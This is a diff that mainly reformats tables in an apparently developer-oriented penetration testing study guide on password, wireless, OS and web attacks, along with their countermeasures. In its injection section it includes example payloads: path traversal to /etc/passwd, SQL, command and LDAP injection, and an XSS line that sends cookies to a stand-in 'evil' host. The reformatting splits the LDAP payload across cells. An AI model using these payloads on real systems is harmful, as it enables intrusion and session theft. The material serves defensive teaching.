@@ -17,12 +17,12 @@
 
 ### Attack Categories (What You're Defending Against)
 
-| Category | Examples |
-| --- | --- |
-| **Nontechnical** | Social engineering, physical access, dumpster diving |
-| **Network infrastructure** | Port scanning, sniffing, DoS, firewall bypasses, SSL/TLS misconfigurations |
-| **Operating system** | Missing patches, weak auth, privilege escalation, buffer overflows |
-| **Application** | SQL injection, XSS, directory traversal, default credentials, insecure login mechanisms |
+| Category                   | Examples                                                                                |
+| -------------------------- | --------------------------------------------------------------------------------------- |
+| **Nontechnical**           | Social engineering, physical access, dumpster diving                                    |
+| **Network infrastructure** | Port scanning, sniffing, DoS, firewall bypasses, SSL/TLS misconfigurations              |
+| **Operating system**       | Missing patches, weak auth, privilege escalation, buffer overflows                      |
+| **Application**            | SQL injection, XSS, directory traversal, default credentials, insecure login mechanisms |
 
 ### Attacker Motivation Spectrum
 
@@ -42,13 +42,15 @@
 6. **Document and report** — findings, evidence, risk ratings, remediation.
 7. **Retest** — verify fixes work.
 
+
+
 ### Blind vs. Knowledge-Based Testing
 
-| Type | Tester Knows | Simulates |
-| --- | --- | --- |
-| **Black-box (blind)** | Nothing about the target | External attacker |
+| Type                           | Tester Knows                           | Simulates                           |
+| ------------------------------ | -------------------------------------- | ----------------------------------- |
+| **Black-box (blind)**          | Nothing about the target               | External attacker                   |
 | **White-box (full knowledge)** | Architecture, source code, credentials | Insider or post-compromise attacker |
-| **Gray-box** | Partial info (e.g. user-level access) | Compromised employee or customer |
+| **Gray-box**                   | Partial info (e.g. user-level access)  | Compromised employee or customer    |
 
 White-box testing finds more vulnerabilities per hour. Black-box testing reveals what an outsider actually sees. Both perspectives matter.
 
@@ -101,13 +103,13 @@ Social engineering bypasses every technical control you build. The most secure a
 
 ### Technical Password Vulnerabilities
 
-| Vulnerability | Impact |
-| --- | --- |
-| Weak hashing algorithms (MD5, SHA-1 unsalted) | Crackable in seconds with rainbow tables |
-| No account lockout | Enables brute-force attacks |
-| Passwords stored in plaintext or reversible encryption | Complete exposure on any data breach |
-| Default credentials left in place | Trivial access to systems, databases, admin panels |
-| No MFA | Single point of failure — one leaked password = full access |
+| Vulnerability                                          | Impact                                                      |
+| ------------------------------------------------------ | ----------------------------------------------------------- |
+| Weak hashing algorithms (MD5, SHA-1 unsalted)          | Crackable in seconds with rainbow tables                    |
+| No account lockout                                     | Enables brute-force attacks                                 |
+| Passwords stored in plaintext or reversible encryption | Complete exposure on any data breach                        |
+| Default credentials left in place                      | Trivial access to systems, databases, admin panels          |
+| No MFA                                                 | Single point of failure — one leaked password = full access |
 
 ### Cracking Methods
 
@@ -119,13 +121,13 @@ Social engineering bypasses every technical control you build. The most secure a
 
 ### Key Tools
 
-| Tool | Purpose |
-| --- | --- |
+| Tool                | Purpose                                                                   |
+| ------------------- | ------------------------------------------------------------------------- |
 | **John the Ripper** | Versatile offline password cracker (dictionary, brute-force, rules-based) |
-| **Hashcat** | GPU-accelerated cracking, fastest for large hash sets |
-| **ophcrack** | Windows password cracker using rainbow tables |
-| **Cain & Abel** | Windows-focused: sniffing, cracking, ARP poisoning |
-| **THC Hydra** | Online brute-forcer for network services (SSH, FTP, HTTP, etc.) |
+| **Hashcat**         | GPU-accelerated cracking, fastest for large hash sets                     |
+| **ophcrack**        | Windows password cracker using rainbow tables                             |
+| **Cain & Abel**     | Windows-focused: sniffing, cracking, ARP poisoning                        |
+| **THC Hydra**       | Online brute-forcer for network services (SSH, FTP, HTTP, etc.)           |
 
 ### Countermeasures for Developers
 
@@ -173,14 +175,14 @@ Connecting to an open port and reading the service banner reveals software and v
 
 ### Key Wireless Attacks
 
-| Attack | What It Does | Countermeasure |
-| --- | --- | --- |
-| **WEP cracking** | Trivially broken (statistical attack on RC4). Don't use WEP — ever. | Use WPA3 or WPA2-Enterprise |
-| **WPA/WPA2 handshake capture + dictionary attack** | Capture the 4-way handshake, crack offline | Strong passphrases (20+ chars), WPA3 |
-| **Evil twin / rogue AP** | Attacker sets up a fake AP with the same SSID | 802.1X authentication, wireless IDS, client certificates |
-| **WPS PIN brute-force** | 8-digit PIN has only ~11,000 combinations due to design flaw | Disable WPS entirely |
-| **MAC spoofing** | Bypass MAC-based access control | MAC filtering is not real security; use proper authentication |
-| **Deauthentication attacks** | Force clients to disconnect and reconnect (to capture handshake or redirect to evil twin) | 802.11w (Management Frame Protection) |
+| Attack                                             | What It Does                                                                              | Countermeasure                                                |
+| -------------------------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
+| **WEP cracking**                                   | Trivially broken (statistical attack on RC4). Don't use WEP — ever.                       | Use WPA3 or WPA2-Enterprise                                   |
+| **WPA/WPA2 handshake capture + dictionary attack** | Capture the 4-way handshake, crack offline                                                | Strong passphrases (20+ chars), WPA3                          |
+| **Evil twin / rogue AP**                           | Attacker sets up a fake AP with the same SSID                                             | 802.1X authentication, wireless IDS, client certificates      |
+| **WPS PIN brute-force**                            | 8-digit PIN has only \~11,000 combinations due to design flaw                             | Disable WPS entirely                                          |
+| **MAC spoofing**                                   | Bypass MAC-based access control                                                           | MAC filtering is not real security; use proper authentication |
+| **Deauthentication attacks**                       | Force clients to disconnect and reconnect (to capture handshake or redirect to evil twin) | 802.11w (Management Frame Protection)                         |
 
 ### Developer Takeaway
 
@@ -203,7 +205,7 @@ If your application handles sensitive data, never assume the network is secure. 
 - **SUID/SGID binaries** — misconfigured SUID root binaries are a classic privilege escalation path. Audit with `find / -perm -4000`.
 - **Weak file permissions** — world-writable config files, readable private keys.
 - **NFS misconfigurations** — exporting filesystems with `no_root_squash` allows remote root access.
-- **`.rhosts` / `hosts.equiv`** — legacy trust relationships that bypass authentication entirely. Remove or lock down.
+- **.rhosts / hosts.equiv** — legacy trust relationships that bypass authentication entirely. Remove or lock down.
 - **Buffer overflows** — still relevant in C/C++ codebases. Use ASLR, stack canaries, and compile with `-fstack-protector`.
 
 ### Countermeasures (Both Platforms)
@@ -223,11 +225,12 @@ If your application handles sensitive data, never assume the network is secure. 
 
 Manipulating file paths to access files outside the intended directory.
 
-```
+```javascript
 GET /app/file?name=../../../etc/passwd
 ```
 
 **Countermeasures:**
+
 - Never use user input directly in file paths.
 - Use a whitelist of allowed files or map user input to an index.
 - Canonicalize paths and verify they stay within the intended directory.
@@ -235,15 +238,16 @@ GET /app/file?name=../../../etc/passwd
 
 ### Input-Filtering Attacks (Injection)
 
-| Attack | Payload Example | Impact |
-| --- | --- | --- |
-| **SQL Injection** | `' OR 1=1 --` | Full database access, data exfiltration, data modification |
-| **XSS (Reflected)** | `<script>document.location='http://evil/steal?c='+document.cookie</script>` | Session hijacking, credential theft |
-| **XSS (Stored)** | Malicious script saved in DB, rendered to all users | Mass compromise of user sessions |
-| **Command Injection** | `; cat /etc/passwd` | OS-level command execution |
-| **LDAP Injection** | `*)(uid=*))(|(uid=*` | Authentication bypass, data leak |
+| Attack                | Payload Example                                                             | Impact                                                     |                                  |
+| --------------------- | --------------------------------------------------------------------------- | ---------------------------------------------------------- | -------------------------------- |
+| **SQL Injection**     | `' OR 1=1 --`                                                               | Full database access, data exfiltration, data modification |                                  |
+| **XSS (Reflected)**   | `<script>document.location='http://evil/steal?c='+document.cookie</script>` | Session hijacking, credential theft                        |                                  |
+| **XSS (Stored)**      | Malicious script saved in DB, rendered to all users                         | Mass compromise of user sessions                           |                                  |
+| **Command Injection** | `; cat /etc/passwd`                                                         | OS-level command execution                                 |                                  |
+| **LDAP Injection**    | \`*)(uid=*))(                                                               | (uid=\*\`                                                  | Authentication bypass, data leak |
 
 **Countermeasures:**
+
 - **Parameterized queries / prepared statements** — the only reliable defense against SQL injection. ORMs help but don't make you immune (raw queries, HQL injection).
 - **Output encoding** — context-aware escaping (HTML, JS, URL, CSS contexts are all different). Use framework-provided escaping.
 - **Input validation** — whitelist acceptable characters/patterns. Reject, don't sanitize (sanitization is error-prone).
@@ -259,13 +263,13 @@ GET /app/file?name=../../../etc/passwd
 
 ### Web Security Testing Tools
 
-| Tool | Purpose |
-| --- | --- |
-| **Burp Suite** | Intercepting proxy, scanner, repeater — the standard for web app testing |
-| **OWASP ZAP** | Free alternative to Burp Suite |
-| **Nikto** | Web server scanner (misconfigurations, dangerous files, outdated software) |
-| **SQLMap** | Automated SQL injection detection and exploitation |
-| **wfuzz / ffuf** | Fuzzing and directory/parameter brute-forcing |
+| Tool             | Purpose                                                                    |
+| ---------------- | -------------------------------------------------------------------------- |
+| **Burp Suite**   | Intercepting proxy, scanner, repeater — the standard for web app testing   |
+| **OWASP ZAP**    | Free alternative to Burp Suite                                             |
+| **Nikto**        | Web server scanner (misconfigurations, dangerous files, outdated software) |
+| **SQLMap**       | Automated SQL injection detection and exploitation                         |
+| **wfuzz / ffuf** | Fuzzing and directory/parameter brute-forcing                              |
 
 ### Source Code Analysis
 
@@ -287,7 +291,7 @@ Automated static analysis (SAST) catches vulnerabilities before deployment. Tool
 
 - Sensitive data in network file shares with overly permissive access.
 - Credentials, API keys, and PII in plaintext files discoverable by scanning shared drives.
-- **Tools like `dumpster`** and simple `grep`/`findstr` can search network shares for patterns like SSN, credit card numbers, passwords in config files.
+- **Tools like dumpster** and simple `grep`/`findstr` can search network shares for patterns like SSN, credit card numbers, passwords in config files.
 
 ### Developer Takeaway
 
@@ -323,10 +327,10 @@ Use a risk-based approach, not just CVSS scores:
 
 **Risk = Likelihood × Impact**
 
-| Factor | Consider |
-| --- | --- |
+| Factor         | Consider                                                                               |
+| -------------- | -------------------------------------------------------------------------------------- |
 | **Likelihood** | Exploit availability, attacker skill required, exposure (internet-facing vs. internal) |
-| **Impact** | Data sensitivity, system criticality, regulatory implications, business disruption |
+| **Impact**     | Data sensitivity, system criticality, regulatory implications, business disruption     |
 
 A medium-severity vulnerability on an internet-facing system with PII may be higher priority than a critical vulnerability on an isolated internal test server.
 
@@ -363,18 +367,18 @@ A medium-severity vulnerability on an internet-facing system with PII may be hig
 
 ## Key Tools Reference
 
-| Tool | Category | Purpose |
-| --- | --- | --- |
-| **Nmap** | Network | Port scanning, service detection, OS fingerprinting |
-| **Nessus / OpenVAS** | Vulnerability | Automated vulnerability scanning |
-| **Metasploit** | Exploitation | Exploit development and execution framework |
-| **Burp Suite** | Web | Intercepting proxy, web vulnerability scanner |
-| **OWASP ZAP** | Web | Free web app security testing |
-| **Wireshark** | Network | Packet capture and analysis |
-| **John the Ripper** | Passwords | Offline password cracking |
-| **Hashcat** | Passwords | GPU-accelerated password cracking |
-| **SQLMap** | Web/DB | Automated SQL injection |
-| **Nikto** | Web | Web server misconfiguration scanner |
-| **Aircrack-ng** | Wireless | WiFi security auditing suite |
-| **Cain & Abel** | Windows | Multi-purpose Windows security tool |
-| **THC Hydra** | Passwords | Online brute-force for network services |
+| Tool                 | Category      | Purpose                                             |
+| -------------------- | ------------- | --------------------------------------------------- |
+| **Nmap**             | Network       | Port scanning, service detection, OS fingerprinting |
+| **Nessus / OpenVAS** | Vulnerability | Automated vulnerability scanning                    |
+| **Metasploit**       | Exploitation  | Exploit development and execution framework         |
+| **Burp Suite**       | Web           | Intercepting proxy, web vulnerability scanner       |
+| **OWASP ZAP**        | Web           | Free web app security testing                       |
+| **Wireshark**        | Network       | Packet capture and analysis                         |
+| **John the Ripper**  | Passwords     | Offline password cracking                           |
+| **Hashcat**          | Passwords     | GPU-accelerated password cracking                   |
+| **SQLMap**           | Web/DB        | Automated SQL injection                             |
+| **Nikto**            | Web           | Web server misconfiguration scanner                 |
+| **Aircrack-ng**      | Wireless      | WiFi security auditing suite                        |
+| **Cain & Abel**      | Windows       | Multi-purpose Windows security tool                 |
+| **THC Hydra**        | Passwords     | Online brute-force for network services             |
